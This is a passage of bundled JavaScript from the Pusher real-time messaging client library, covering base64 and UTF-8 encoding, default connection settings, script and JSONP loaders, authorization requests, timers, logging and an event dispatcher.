                d4.__proto__ = b2;
              } || function(d4, b2) {
                for (var p in b2) if (b2.hasOwnProperty(p)) d4[p] = b2[p];
              };
              return extendStatics(d3, b);
            };
            return function(d3, b) {
              extendStatics(d3, b);
              function __() {
                this.constructor = d3;
              }
              d3.prototype = b === null ? Object.create(b) : (__.prototype = b.prototype, new __());
            };
          }();
          Object.defineProperty(exports2, "__esModule", { value: true });
          var INVALID_BYTE = 256;
          var Coder = (
            /** @class */
            function() {
              function Coder2(_paddingCharacter) {
                if (_paddingCharacter === void 0) {
                  _paddingCharacter = "=";
                }
                this._paddingCharacter = _paddingCharacter;
              }
              Coder2.prototype.encodedLength = function(length) {
                if (!this._paddingCharacter) {
                  return (length * 8 + 5) / 6 | 0;
                }
                return (length + 2) / 3 * 4 | 0;
              };
              Coder2.prototype.encode = function(data) {
                var out = "";
                var i2 = 0;
                for (; i2 < data.length - 2; i2 += 3) {
                  var c = data[i2] << 16 | data[i2 + 1] << 8 | data[i2 + 2];
                  out += this._encodeByte(c >>> 3 * 6 & 63);
                  out += this._encodeByte(c >>> 2 * 6 & 63);
                  out += this._encodeByte(c >>> 1 * 6 & 63);
                  out += this._encodeByte(c >>> 0 * 6 & 63);
                }
                var left2 = data.length - i2;
                if (left2 > 0) {
                  var c = data[i2] << 16 | (left2 === 2 ? data[i2 + 1] << 8 : 0);
                  out += this._encodeByte(c >>> 3 * 6 & 63);
                  out += this._encodeByte(c >>> 2 * 6 & 63);
                  if (left2 === 2) {
                    out += this._encodeByte(c >>> 1 * 6 & 63);
                  } else {
                    out += this._paddingCharacter || "";
                  }
                  out += this._paddingCharacter || "";
                }
                return out;
              };
              Coder2.prototype.maxDecodedLength = function(length) {
                if (!this._paddingCharacter) {
                  return (length * 6 + 7) / 8 | 0;
                }
                return length / 4 * 3 | 0;
              };
              Coder2.prototype.decodedLength = function(s2) {
                return this.maxDecodedLength(s2.length - this._getPaddingLength(s2));
              };
              Coder2.prototype.decode = function(s2) {
                if (s2.length === 0) {
                  return new Uint8Array(0);
                }
                var paddingLength = this._getPaddingLength(s2);
                var length = s2.length - paddingLength;
                var out = new Uint8Array(this.maxDecodedLength(length));
                var op = 0;
                var i2 = 0;
                var haveBad = 0;
                var v0 = 0, v1 = 0, v2 = 0, v3 = 0;
                for (; i2 < length - 4; i2 += 4) {
                  v0 = this._decodeChar(s2.charCodeAt(i2 + 0));
                  v1 = this._decodeChar(s2.charCodeAt(i2 + 1));
                  v2 = this._decodeChar(s2.charCodeAt(i2 + 2));
                  v3 = this._decodeChar(s2.charCodeAt(i2 + 3));
                  out[op++] = v0 << 2 | v1 >>> 4;
                  out[op++] = v1 << 4 | v2 >>> 2;
                  out[op++] = v2 << 6 | v3;
                  haveBad |= v0 & INVALID_BYTE;
                  haveBad |= v1 & INVALID_BYTE;
                  haveBad |= v2 & INVALID_BYTE;
                  haveBad |= v3 & INVALID_BYTE;
                }
                if (i2 < length - 1) {
                  v0 = this._decodeChar(s2.charCodeAt(i2));
                  v1 = this._decodeChar(s2.charCodeAt(i2 + 1));
                  out[op++] = v0 << 2 | v1 >>> 4;
                  haveBad |= v0 & INVALID_BYTE;
                  haveBad |= v1 & INVALID_BYTE;
                }
                if (i2 < length - 2) {
                  v2 = this._decodeChar(s2.charCodeAt(i2 + 2));
                  out[op++] = v1 << 4 | v2 >>> 2;
                  haveBad |= v2 & INVALID_BYTE;
                }
                if (i2 < length - 3) {
                  v3 = this._decodeChar(s2.charCodeAt(i2 + 3));
                  out[op++] = v2 << 6 | v3;
                  haveBad |= v3 & INVALID_BYTE;
                }
                if (haveBad !== 0) {
                  throw new Error("Base64Coder: incorrect characters for decoding");
                }
                return out;
              };
              Coder2.prototype._encodeByte = function(b) {
                var result = b;
                result += 65;
                result += 25 - b >>> 8 & 0 - 65 - 26 + 97;
                result += 51 - b >>> 8 & 26 - 97 - 52 + 48;
                result += 61 - b >>> 8 & 52 - 48 - 62 + 43;
                result += 62 - b >>> 8 & 62 - 43 - 63 + 47;
                return String.fromCharCode(result);
              };
              Coder2.prototype._decodeChar = function(c) {
                var result = INVALID_BYTE;
                result += (42 - c & c - 44) >>> 8 & -INVALID_BYTE + c - 43 + 62;
                result += (46 - c & c - 48) >>> 8 & -INVALID_BYTE + c - 47 + 63;
                result += (47 - c & c - 58) >>> 8 & -INVALID_BYTE + c - 48 + 52;
                result += (64 - c & c - 91) >>> 8 & -INVALID_BYTE + c - 65 + 0;
                result += (96 - c & c - 123) >>> 8 & -INVALID_BYTE + c - 97 + 26;
                return result;
              };
              Coder2.prototype._getPaddingLength = function(s2) {
                var paddingLength = 0;
                if (this._paddingCharacter) {
                  for (var i2 = s2.length - 1; i2 >= 0; i2--) {
                    if (s2[i2] !== this._paddingCharacter) {
                      break;
                    }
                    paddingLength++;
                  }
                  if (s2.length < 4 || paddingLength > 2) {
                    throw new Error("Base64Coder: incorrect padding");
                  }
                }
                return paddingLength;
              };
              return Coder2;
            }()
          );
          exports2.Coder = Coder;
          var stdCoder = new Coder();
          function encode3(data) {
            return stdCoder.encode(data);
          }
          exports2.encode = encode3;
          function decode2(s2) {
            return stdCoder.decode(s2);
          }
          exports2.decode = decode2;
          var URLSafeCoder = (
            /** @class */
            function(_super) {
              __extends(URLSafeCoder2, _super);
              function URLSafeCoder2() {
                return _super !== null && _super.apply(this, arguments) || this;
              }
              URLSafeCoder2.prototype._encodeByte = function(b) {
                var result = b;
                result += 65;
                result += 25 - b >>> 8 & 0 - 65 - 26 + 97;
                result += 51 - b >>> 8 & 26 - 97 - 52 + 48;
                result += 61 - b >>> 8 & 52 - 48 - 62 + 45;
                result += 62 - b >>> 8 & 62 - 45 - 63 + 95;
                return String.fromCharCode(result);
              };
              URLSafeCoder2.prototype._decodeChar = function(c) {
                var result = INVALID_BYTE;
                result += (44 - c & c - 46) >>> 8 & -INVALID_BYTE + c - 45 + 62;
                result += (94 - c & c - 96) >>> 8 & -INVALID_BYTE + c - 95 + 63;
                result += (47 - c & c - 58) >>> 8 & -INVALID_BYTE + c - 48 + 52;
                result += (64 - c & c - 91) >>> 8 & -INVALID_BYTE + c - 65 + 0;
                result += (96 - c & c - 123) >>> 8 & -INVALID_BYTE + c - 97 + 26;
                return result;
              };
              return URLSafeCoder2;
            }(Coder)
          );
          exports2.URLSafeCoder = URLSafeCoder;
          var urlSafeCoder = new URLSafeCoder();
          function encodeURLSafe(data) {
            return urlSafeCoder.encode(data);
          }
          exports2.encodeURLSafe = encodeURLSafe;
          function decodeURLSafe(s2) {
            return urlSafeCoder.decode(s2);
          }
          exports2.decodeURLSafe = decodeURLSafe;
          exports2.encodedLength = function(length) {
            return stdCoder.encodedLength(length);
          };
          exports2.maxDecodedLength = function(length) {
            return stdCoder.maxDecodedLength(length);
          };
          exports2.decodedLength = function(s2) {
            return stdCoder.decodedLength(s2);
          };
        },
        /* 1 */
        /***/
        function(module2, exports2, __webpack_require__) {
          Object.defineProperty(exports2, "__esModule", { value: true });
          var INVALID_UTF16 = "utf8: invalid string";
          var INVALID_UTF8 = "utf8: invalid source encoding";
          function encode3(s2) {
            var arr = new Uint8Array(encodedLength(s2));
            var pos = 0;
            for (var i2 = 0; i2 < s2.length; i2++) {
              var c = s2.charCodeAt(i2);
              if (c < 128) {
                arr[pos++] = c;
              } else if (c < 2048) {
                arr[pos++] = 192 | c >> 6;
                arr[pos++] = 128 | c & 63;
              } else if (c < 55296) {
                arr[pos++] = 224 | c >> 12;
                arr[pos++] = 128 | c >> 6 & 63;
                arr[pos++] = 128 | c & 63;
              } else {
                i2++;
                c = (c & 1023) << 10;
                c |= s2.charCodeAt(i2) & 1023;
                c += 65536;
                arr[pos++] = 240 | c >> 18;
                arr[pos++] = 128 | c >> 12 & 63;
                arr[pos++] = 128 | c >> 6 & 63;
                arr[pos++] = 128 | c & 63;
              }
            }
            return arr;
          }
          exports2.encode = encode3;
          function encodedLength(s2) {
            var result = 0;
            for (var i2 = 0; i2 < s2.length; i2++) {
              var c = s2.charCodeAt(i2);
              if (c < 128) {
                result += 1;
              } else if (c < 2048) {
                result += 2;
              } else if (c < 55296) {
                result += 3;
              } else if (c <= 57343) {
                if (i2 >= s2.length - 1) {
                  throw new Error(INVALID_UTF16);
                }
                i2++;
                result += 4;
              } else {
                throw new Error(INVALID_UTF16);
              }
            }
            return result;
          }
          exports2.encodedLength = encodedLength;
          function decode2(arr) {
            var chars = [];
            for (var i2 = 0; i2 < arr.length; i2++) {
              var b = arr[i2];
              if (b & 128) {
                var min2 = void 0;
                if (b < 224) {
                  if (i2 >= arr.length) {
                    throw new Error(INVALID_UTF8);
                  }
                  var n1 = arr[++i2];
                  if ((n1 & 192) !== 128) {
                    throw new Error(INVALID_UTF8);
                  }
                  b = (b & 31) << 6 | n1 & 63;
                  min2 = 128;
                } else if (b < 240) {
                  if (i2 >= arr.length - 1) {
                    throw new Error(INVALID_UTF8);
                  }
                  var n1 = arr[++i2];
                  var n2 = arr[++i2];
                  if ((n1 & 192) !== 128 || (n2 & 192) !== 128) {
                    throw new Error(INVALID_UTF8);
                  }
                  b = (b & 15) << 12 | (n1 & 63) << 6 | n2 & 63;
                  min2 = 2048;
                } else if (b < 248) {
                  if (i2 >= arr.length - 2) {
                    throw new Error(INVALID_UTF8);
                  }
                  var n1 = arr[++i2];
                  var n2 = arr[++i2];
                  var n3 = arr[++i2];
                  if ((n1 & 192) !== 128 || (n2 & 192) !== 128 || (n3 & 192) !== 128) {
                    throw new Error(INVALID_UTF8);
                  }
                  b = (b & 15) << 18 | (n1 & 63) << 12 | (n2 & 63) << 6 | n3 & 63;
                  min2 = 65536;
                } else {
                  throw new Error(INVALID_UTF8);
                }
                if (b < min2 || b >= 55296 && b <= 57343) {
                  throw new Error(INVALID_UTF8);
                }
                if (b >= 65536) {
                  if (b > 1114111) {
                    throw new Error(INVALID_UTF8);
                  }
                  b -= 65536;
                  chars.push(String.fromCharCode(55296 | b >> 10));
                  b = 56320 | b & 1023;
                }
              }
              chars.push(String.fromCharCode(b));
            }
            return chars.join("");
          }
          exports2.decode = decode2;
        },
        /* 2 */
        /***/
        function(module2, exports2, __webpack_require__) {
          module2.exports = __webpack_require__(3).default;
        },
        /* 3 */
        /***/
        function(module2, __webpack_exports__, __webpack_require__) {
          __webpack_require__.r(__webpack_exports__);
          class ScriptReceiverFactory {
            constructor(prefix2, name) {
              this.lastId = 0;
              this.prefix = prefix2;
              this.name = name;
            }
            create(callback) {
              this.lastId++;
              var number2 = this.lastId;
              var id = this.prefix + number2;
              var name = this.name + "[" + number2 + "]";
              var called = false;
              var callbackWrapper = function() {
                if (!called) {
                  callback.apply(null, arguments);
                  called = true;
                }
              };
              this[number2] = callbackWrapper;
              return { number: number2, id, name, callback: callbackWrapper };
            }
            remove(receiver) {
              delete this[receiver.number];
            }
          }
          var ScriptReceivers = new ScriptReceiverFactory("_pusher_script_", "Pusher.ScriptReceivers");
          var Defaults = {
            VERSION: "8.4.0-rc2",
            PROTOCOL: 7,
            wsPort: 80,
            wssPort: 443,
            wsPath: "",
            httpHost: "sockjs.pusher.com",
            httpPort: 80,
            httpsPort: 443,
            httpPath: "/pusher",
            stats_host: "stats.pusher.com",
            authEndpoint: "/pusher/auth",
            authTransport: "ajax",
            activityTimeout: 12e4,
            pongTimeout: 3e4,
            unavailableTimeout: 1e4,
            userAuthentication: {
              endpoint: "/pusher/user-auth",
              transport: "ajax"
            },
            channelAuthorization: {
              endpoint: "/pusher/auth",
              transport: "ajax"
            },
            cdn_http: "http://js.pusher.com",
            cdn_https: "https://js.pusher.com",
            dependency_suffix: ""
          };
          var defaults2 = Defaults;
          class dependency_loader_DependencyLoader {
            constructor(options) {
              this.options = options;
              this.receivers = options.receivers || ScriptReceivers;
              this.loading = {};
            }
            load(name, options, callback) {
              var self = this;
              if (self.loading[name] && self.loading[name].length > 0) {
                self.loading[name].push(callback);
              } else {
                self.loading[name] = [callback];
                var request = runtime.createScriptRequest(self.getPath(name, options));
                var receiver = self.receivers.create(function(error2) {
                  self.receivers.remove(receiver);
                  if (self.loading[name]) {
                    var callbacks = self.loading[name];
                    delete self.loading[name];
                    var successCallback = function(wasSuccessful) {
                      if (!wasSuccessful) {
                        request.cleanup();
                      }
                    };
                    for (var i2 = 0; i2 < callbacks.length; i2++) {
                      callbacks[i2](error2, successCallback);
                    }
                  }
                });
                request.send(receiver);
              }
            }
            getRoot(options) {
              var cdn;
              var protocol = runtime.getDocument().location.protocol;
              if (options && options.useTLS || protocol === "https:") {
                cdn = this.options.cdn_https;
              } else {
                cdn = this.options.cdn_http;
              }
              return cdn.replace(/\/*$/, "") + "/" + this.options.version;
            }
            getPath(name, options) {
              return this.getRoot(options) + "/" + name + this.options.suffix + ".js";
            }
          }
          var DependenciesReceivers = new ScriptReceiverFactory("_pusher_dependencies", "Pusher.DependenciesReceivers");
          var Dependencies = new dependency_loader_DependencyLoader({
            cdn_http: defaults2.cdn_http,
            cdn_https: defaults2.cdn_https,
            version: defaults2.VERSION,
            suffix: defaults2.dependency_suffix,
            receivers: DependenciesReceivers
          });
          const urlStore = {
            baseUrl: "https://pusher.com",
            urls: {
              authenticationEndpoint: {
                path: "/docs/channels/server_api/authenticating_users"
              },
              authorizationEndpoint: {
                path: "/docs/channels/server_api/authorizing-users/"
              },
              javascriptQuickStart: {
                path: "/docs/javascript_quick_start"
              },
              triggeringClientEvents: {
                path: "/docs/client_api_guide/client_events#trigger-events"
              },
              encryptedChannelSupport: {
                fullUrl: "https://github.com/pusher/pusher-js/tree/cc491015371a4bde5743d1c87a0fbac0feb53195#encrypted-channel-support"
              }
            }
          };
          const buildLogSuffix = function(key) {
            const urlPrefix = "See:";
            const urlObj = urlStore.urls[key];
            if (!urlObj)
              return "";
            let url;
            if (urlObj.fullUrl) {
              url = urlObj.fullUrl;
            } else if (urlObj.path) {
              url = urlStore.baseUrl + urlObj.path;
            }
            if (!url)
              return "";
            return `${urlPrefix} ${url}`;
          };
          var url_store = { buildLogSuffix };
          var AuthRequestType;
          (function(AuthRequestType2) {
            AuthRequestType2["UserAuthentication"] = "user-authentication";
            AuthRequestType2["ChannelAuthorization"] = "channel-authorization";
          })(AuthRequestType || (AuthRequestType = {}));
          class BadEventName extends Error {
            constructor(msg) {
              super(msg);
              Object.setPrototypeOf(this, new.target.prototype);
            }
          }
          class BadChannelName extends Error {
            constructor(msg) {
              super(msg);
              Object.setPrototypeOf(this, new.target.prototype);
            }
          }
          class RequestTimedOut extends Error {
            constructor(msg) {
              super(msg);
              Object.setPrototypeOf(this, new.target.prototype);
            }
          }
          class TransportPriorityTooLow extends Error {
            constructor(msg) {
              super(msg);
              Object.setPrototypeOf(this, new.target.prototype);
            }
          }
          class TransportClosed extends Error {
            constructor(msg) {
              super(msg);
              Object.setPrototypeOf(this, new.target.prototype);
            }
          }
          class UnsupportedFeature extends Error {
            constructor(msg) {
              super(msg);
              Object.setPrototypeOf(this, new.target.prototype);
            }
          }
          class UnsupportedTransport extends Error {
            constructor(msg) {
              super(msg);
              Object.setPrototypeOf(this, new.target.prototype);
            }
          }
          class UnsupportedStrategy extends Error {
            constructor(msg) {
              super(msg);
              Object.setPrototypeOf(this, new.target.prototype);
            }
          }
          class HTTPAuthError extends Error {
            constructor(status, msg) {
              super(msg);
              this.status = status;
              Object.setPrototypeOf(this, new.target.prototype);
            }
          }
          const ajax = function(context, query, authOptions, authRequestType, callback) {
            const xhr = runtime.createXHR();
            xhr.open("POST", authOptions.endpoint, true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            for (var headerName in authOptions.headers) {
              xhr.setRequestHeader(headerName, authOptions.headers[headerName]);
            }
            if (authOptions.headersProvider != null) {
              let dynamicHeaders = authOptions.headersProvider();
              for (var headerName in dynamicHeaders) {
                xhr.setRequestHeader(headerName, dynamicHeaders[headerName]);
              }
            }
            xhr.onreadystatechange = function() {
              if (xhr.readyState === 4) {
                if (xhr.status === 200) {
                  let data;
                  let parsed = false;
                  try {
                    data = JSON.parse(xhr.responseText);
                    parsed = true;
                  } catch (e2) {
                    callback(new HTTPAuthError(200, `JSON returned from ${authRequestType.toString()} endpoint was invalid, yet status code was 200. Data was: ${xhr.responseText}`), null);
                  }
                  if (parsed) {
                    callback(null, data);
                  }
                } else {
                  let suffix = "";
                  switch (authRequestType) {
                    case AuthRequestType.UserAuthentication:
                      suffix = url_store.buildLogSuffix("authenticationEndpoint");
                      break;
                    case AuthRequestType.ChannelAuthorization:
                      suffix = `Clients must be authorized to join private or presence channels. ${url_store.buildLogSuffix("authorizationEndpoint")}`;
                      break;
                  }
                  callback(new HTTPAuthError(xhr.status, `Unable to retrieve auth string from ${authRequestType.toString()} endpoint - received status: ${xhr.status} from ${authOptions.endpoint}. ${suffix}`), null);
                }
              }
            };
            xhr.send(query);
            return xhr;
          };
          var xhr_auth = ajax;
          function encode3(s2) {
            return btoa(utob(s2));
          }
          var fromCharCode = String.fromCharCode;
          var b64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
          var cb_utob = function(c) {
            var cc = c.charCodeAt(0);
            return cc < 128 ? c : cc < 2048 ? fromCharCode(192 | cc >>> 6) + fromCharCode(128 | cc & 63) : fromCharCode(224 | cc >>> 12 & 15) + fromCharCode(128 | cc >>> 6 & 63) + fromCharCode(128 | cc & 63);
          };
          var utob = function(u) {
            return u.replace(/[^\x00-\x7F]/g, cb_utob);
          };
          var cb_encode = function(ccc) {
            var padlen = [0, 2, 1][ccc.length % 3];
            var ord = ccc.charCodeAt(0) << 16 | (ccc.length > 1 ? ccc.charCodeAt(1) : 0) << 8 | (ccc.length > 2 ? ccc.charCodeAt(2) : 0);
            var chars = [
              b64chars.charAt(ord >>> 18),
              b64chars.charAt(ord >>> 12 & 63),
              padlen >= 2 ? "=" : b64chars.charAt(ord >>> 6 & 63),
              padlen >= 1 ? "=" : b64chars.charAt(ord & 63)
            ];
            return chars.join("");
          };
          var btoa = window.btoa || function(b) {
            return b.replace(/[\s\S]{1,3}/g, cb_encode);
          };
          class Timer2 {
            constructor(set, clear, delay, callback) {
              this.clear = clear;
              this.timer = set(() => {
                if (this.timer) {
                  this.timer = callback(this.timer);
                }
              }, delay);
            }
            isRunning() {
              return this.timer !== null;
            }
            ensureAborted() {
              if (this.timer) {
                this.clear(this.timer);
                this.timer = null;
              }
            }
          }
          var abstract_timer = Timer2;
          function timers_clearTimeout(timer) {
            window.clearTimeout(timer);
          }
          function timers_clearInterval(timer) {
            window.clearInterval(timer);
          }
          class timers_OneOffTimer extends abstract_timer {
            constructor(delay, callback) {
              super(setTimeout, timers_clearTimeout, delay, function(timer) {
                callback();
                return null;
              });
            }
          }
          class timers_PeriodicTimer extends abstract_timer {
            constructor(delay, callback) {
              super(setInterval, timers_clearInterval, delay, function(timer) {
                callback();
                return timer;
              });
            }
          }
          var Util = {
            now() {
              if (Date.now) {
                return Date.now();
              } else {
                return (/* @__PURE__ */ new Date()).valueOf();
              }
            },
            defer(callback) {
              return new timers_OneOffTimer(0, callback);
            },
            method(name, ...args) {
              var boundArguments = Array.prototype.slice.call(arguments, 1);
              return function(object) {
                return object[name].apply(object, boundArguments.concat(arguments));
              };
            }
          };
          var util = Util;
          function extend(target, ...sources) {
            for (var i2 = 0; i2 < sources.length; i2++) {
              var extensions2 = sources[i2];
              for (var property in extensions2) {
                if (extensions2[property] && extensions2[property].constructor && extensions2[property].constructor === Object) {
                  target[property] = extend(target[property] || {}, extensions2[property]);
                } else {
                  target[property] = extensions2[property];
                }
              }
            }
            return target;
          }
          function stringify3() {
            var m3 = ["Pusher"];
            for (var i2 = 0; i2 < arguments.length; i2++) {
              if (typeof arguments[i2] === "string") {
                m3.push(arguments[i2]);
              } else {
                m3.push(safeJSONStringify(arguments[i2]));
              }
            }
            return m3.join(" : ");
          }
          function arrayIndexOf(array2, item) {
            var nativeIndexOf = Array.prototype.indexOf;
            if (array2 === null) {
              return -1;
            }
            if (nativeIndexOf && array2.indexOf === nativeIndexOf) {
              return array2.indexOf(item);
            }
            for (var i2 = 0, l2 = array2.length; i2 < l2; i2++) {
              if (array2[i2] === item) {
                return i2;
              }
            }
            return -1;
          }
          function objectApply(object, f) {
            for (var key in object) {
              if (Object.prototype.hasOwnProperty.call(object, key)) {
                f(object[key], key, object);
              }
            }
          }
          function keys(object) {
            var keys2 = [];
            objectApply(object, function(_, key) {
              keys2.push(key);
            });
            return keys2;
          }
          function values(object) {
            var values2 = [];
            objectApply(object, function(value) {
              values2.push(value);
            });
            return values2;
          }
          function apply(array2, f, context) {
            for (var i2 = 0; i2 < array2.length; i2++) {
              f.call(context || window, array2[i2], i2, array2);
            }
          }
          function map(array2, f) {
            var result = [];
            for (var i2 = 0; i2 < array2.length; i2++) {
              result.push(f(array2[i2], i2, array2, result));
            }
            return result;
          }
          function mapObject(object, f) {
            var result = {};
            objectApply(object, function(value, key) {
              result[key] = f(value);
            });
            return result;
          }
          function filter2(array2, test) {
            test = test || function(value) {
              return !!value;
            };
            var result = [];
            for (var i2 = 0; i2 < array2.length; i2++) {
              if (test(array2[i2], i2, array2, result)) {
                result.push(array2[i2]);
              }
            }
            return result;
          }
          function filterObject(object, test) {
            var result = {};
            objectApply(object, function(value, key) {
              if (test && test(value, key, object, result) || Boolean(value)) {
                result[key] = value;
              }
            });
            return result;
          }
          function flatten(object) {
            var result = [];
            objectApply(object, function(value, key) {
              result.push([key, value]);
            });
            return result;
          }
          function any(array2, test) {
            for (var i2 = 0; i2 < array2.length; i2++) {
              if (test(array2[i2], i2, array2)) {
                return true;
              }
            }
            return false;
          }
          function collections_all(array2, test) {
            for (var i2 = 0; i2 < array2.length; i2++) {
              if (!test(array2[i2], i2, array2)) {
                return false;
              }
            }
            return true;
          }
          function encodeParamsObject(data) {
            return mapObject(data, function(value) {
              if (typeof value === "object") {
                value = safeJSONStringify(value);
              }
              return encodeURIComponent(encode3(value.toString()));
            });
          }
          function buildQueryString(data) {
            var params = filterObject(data, function(value) {
              return value !== void 0;
            });
            var query = map(flatten(encodeParamsObject(params)), util.method("join", "=")).join("&");
            return query;
          }
          function decycleObject(object) {
            var objects = [], paths = [];
            return function derez(value, path) {
              var i2, name, nu;
              switch (typeof value) {
                case "object":
                  if (!value) {
                    return null;
                  }
                  for (i2 = 0; i2 < objects.length; i2 += 1) {
                    if (objects[i2] === value) {
                      return { $ref: paths[i2] };
                    }
                  }
                  objects.push(value);
                  paths.push(path);
                  if (Object.prototype.toString.apply(value) === "[object Array]") {
                    nu = [];
                    for (i2 = 0; i2 < value.length; i2 += 1) {
                      nu[i2] = derez(value[i2], path + "[" + i2 + "]");
                    }
                  } else {
                    nu = {};
                    for (name in value) {
                      if (Object.prototype.hasOwnProperty.call(value, name)) {
                        nu[name] = derez(value[name], path + "[" + JSON.stringify(name) + "]");
                      }
                    }
                  }
                  return nu;
                case "number":
                case "string":
                case "boolean":
                  return value;
              }
            }(object, "$");
          }
          function safeJSONStringify(source) {
            try {
              return JSON.stringify(source);
            } catch (e2) {
              return JSON.stringify(decycleObject(source));
            }
          }
          class logger_Logger {
            constructor() {
              this.globalLog = (message) => {
                if (window.console && window.console.log) {
                  window.console.log(message);
                }
              };
            }
            debug(...args) {
              this.log(this.globalLog, args);
            }
            warn(...args) {
              this.log(this.globalLogWarn, args);
            }
            error(...args) {
              this.log(this.globalLogError, args);
            }
            globalLogWarn(message) {
              if (window.console && window.console.warn) {
                window.console.warn(message);
              } else {
                this.globalLog(message);
              }
            }
            globalLogError(message) {
              if (window.console && window.console.error) {
                window.console.error(message);
              } else {
                this.globalLogWarn(message);
              }
            }
            log(defaultLoggingFunction, ...args) {
              var message = stringify3.apply(this, arguments);
              if (core_pusher.log) {
                core_pusher.log(message);
              } else if (core_pusher.logToConsole) {
                const log = defaultLoggingFunction.bind(this);
                log(message);
              }
            }
          }
          var logger = new logger_Logger();
          var jsonp = function(context, query, authOptions, authRequestType, callback) {
            if (authOptions.headers !== void 0 || authOptions.headersProvider != null) {
              logger.warn(`To send headers with the ${authRequestType.toString()} request, you must use AJAX, rather than JSONP.`);
            }
            var callbackName = context.nextAuthCallbackID.toString();
            context.nextAuthCallbackID++;
            var document2 = context.getDocument();
            var script = document2.createElement("script");
            context.auth_callbacks[callbackName] = function(data) {
              callback(null, data);
            };
            var callback_name = "Pusher.auth_callbacks['" + callbackName + "']";
            script.src = authOptions.endpoint + "?callback=" + encodeURIComponent(callback_name) + "&" + query;
            var head = document2.getElementsByTagName("head")[0] || document2.documentElement;
            head.insertBefore(script, head.firstChild);
          };
          var jsonp_auth = jsonp;
          class ScriptRequest {
            constructor(src) {
              this.src = src;
            }
            send(receiver) {
              var self = this;
              var errorString = "Error loading " + self.src;
              self.script = document.createElement("script");
              self.script.id = receiver.id;
              self.script.src = self.src;
              self.script.type = "text/javascript";
              self.script.charset = "UTF-8";
              if (self.script.addEventListener) {
                self.script.onerror = function() {
                  receiver.callback(errorString);
                };
                self.script.onload = function() {
                  receiver.callback(null);
                };
              } else {
                self.script.onreadystatechange = function() {
                  if (self.script.readyState === "loaded" || self.script.readyState === "complete") {
                    receiver.callback(null);
                  }
                };
              }
              if (self.script.async === void 0 && document.attachEvent && /opera/i.test(navigator.userAgent)) {
                self.errorScript = document.createElement("script");
                self.errorScript.id = receiver.id + "_error";
                self.errorScript.text = receiver.name + "('" + errorString + "');";
                self.script.async = self.errorScript.async = false;
              } else {
                self.script.async = true;
              }
              var head = document.getElementsByTagName("head")[0];
              head.insertBefore(self.script, head.firstChild);
              if (self.errorScript) {
                head.insertBefore(self.errorScript, self.script.nextSibling);
              }
            }
            cleanup() {
              if (this.script) {
                this.script.onload = this.script.onerror = null;
                this.script.onreadystatechange = null;
              }
              if (this.script && this.script.parentNode) {
                this.script.parentNode.removeChild(this.script);
              }
              if (this.errorScript && this.errorScript.parentNode) {
                this.errorScript.parentNode.removeChild(this.errorScript);
              }
              this.script = null;
              this.errorScript = null;
            }
          }
          class jsonp_request_JSONPRequest {
            constructor(url, data) {
              this.url = url;
              this.data = data;
            }
            send(receiver) {
              if (this.request) {
                return;
              }
              var query = buildQueryString(this.data);
              var url = this.url + "/" + receiver.number + "?" + query;
              this.request = runtime.createScriptRequest(url);
              this.request.send(receiver);
            }
            cleanup() {
              if (this.request) {
                this.request.cleanup();
              }
            }
          }
          var getAgent = function(sender, useTLS) {
            return function(data, callback) {
              var scheme = "http" + (useTLS ? "s" : "") + "://";
              var url = scheme + (sender.host || sender.options.host) + sender.options.path;
              var request = runtime.createJSONPRequest(url, data);
              var receiver = runtime.ScriptReceivers.create(function(error2, result) {
                ScriptReceivers.remove(receiver);
                request.cleanup();
                if (result && result.host) {
                  sender.host = result.host;
                }
                if (callback) {
                  callback(error2, result);
                }
              });
              request.send(receiver);
            };
          };
          var jsonp_timeline_jsonp = {
            name: "jsonp",
            getAgent
          };
          var jsonp_timeline = jsonp_timeline_jsonp;
          function getGenericURL(baseScheme, params, path) {
            var scheme = baseScheme + (params.useTLS ? "s" : "");
            var host = params.useTLS ? params.hostTLS : params.hostNonTLS;
            return scheme + "://" + host + path;
          }
          function getGenericPath(key, queryString) {
            var path = "/app/" + key;
            var query = "?protocol=" + defaults2.PROTOCOL + "&client=js&version=" + defaults2.VERSION + (queryString ? "&" + queryString : "");
            return path + query;
          }
          var ws = {
            getInitial: function(key, params) {
              var path = (params.httpPath || "") + getGenericPath(key, "flash=false");
              return getGenericURL("ws", params, path);
            }
          };
          var http = {
            getInitial: function(key, params) {
              var path = (params.httpPath || "/pusher") + getGenericPath(key);
              return getGenericURL("http", params, path);
            }
          };
          var sockjs = {
            getInitial: function(key, params) {
              return getGenericURL("http", params, params.httpPath || "/pusher");
            },
            getPath: function(key, params) {
              return getGenericPath(key);
            }
          };
          class callback_registry_CallbackRegistry {
            constructor() {
              this._callbacks = {};
            }
            get(name) {
              return this._callbacks[prefix(name)];
            }
            add(name, callback, context) {
              var prefixedEventName = prefix(name);
              this._callbacks[prefixedEventName] = this._callbacks[prefixedEventName] || [];
              this._callbacks[prefixedEventName].push({
                fn: callback,
                context
              });
            }
            remove(name, callback, context) {
              if (!name && !callback && !context) {
                this._callbacks = {};
                return;
              }
              var names = name ? [prefix(name)] : keys(this._callbacks);
              if (callback || context) {
                this.removeCallback(names, callback, context);
              } else {
                this.removeAllCallbacks(names);
              }
            }
            removeCallback(names, callback, context) {
              apply(names, function(name) {
                this._callbacks[name] = filter2(this._callbacks[name] || [], function(binding) {
                  return callback && callback !== binding.fn || context && context !== binding.context;
                });
                if (this._callbacks[name].length === 0) {
                  delete this._callbacks[name];
                }
              }, this);
            }
            removeAllCallbacks(names) {
              apply(names, function(name) {
                delete this._callbacks[name];
              }, this);
            }
          }
          function prefix(name) {
            return "_" + name;
          }
          class dispatcher_Dispatcher {
            constructor(failThrough) {
              this.callbacks = new callback_registry_CallbackRegistry();
              this.global_callbacks = [];
              this.failThrough = failThrough;
            }
            bind(eventName, callback, context) {
              this.callbacks.add(eventName, callback, context);
              return this;
            }
            bind_global(callback) {
              this.global_callbacks.push(callback);
              return this;
            }
            unbind(eventName, callback, context) {
              this.callbacks.remove(eventName, callback, context);
              return this;
            }
            unbind_global(callback) {
              if (!callback) {
                this.global_callbacks = [];
                return this;
              }
              this.global_callbacks = filter2(this.global_callbacks || [], (c) => c !== callback);
              return this;
            }
            unbind_all() {
              this.unbind();
              this.unbind_global();
              return this;
            }
            emit(eventName, data, metadata) {
              for (var i2 = 0; i2 < this.global_callbacks.length; i2++) {
                this.global_callbacks[i2](eventName, data);
              }
              var callbacks = this.callbacks.get(eventName);
              var args = [];
              if (metadata) {
                args.push(data, metadata);
              } else if (data) {
                args.push(data);
              }
